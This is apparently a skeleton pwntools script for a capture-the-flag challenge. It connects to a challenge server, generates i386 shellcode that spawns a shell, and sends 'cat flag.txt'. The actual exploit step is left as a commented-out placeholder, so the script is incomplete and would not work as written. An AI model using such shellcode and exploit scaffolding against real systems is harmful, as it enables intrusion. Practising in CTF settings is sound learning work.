from pwn import *

r = remote('shell.challs.cyberchallenge.it', 9123)

# Generate a shellcode that spawns a shell
shellcode = asm(shellcraft.i386.sh())

# Exploit goes here
# This is highly dependent on the specific vulnerability of the program
# For example, if there's a buffer overflow, you might do something like:
# payload = fit({offset: shellcode})
# r.sendline(payload)

# If the exploit is successful, we might be able to execute arbitrary commands
# Let's try to display the contents of flag.txt
r.sendline('cat flag.txt')

# Receive the output
output = r.recv()

# Print the output
print(output)

# Close the connection
r.close()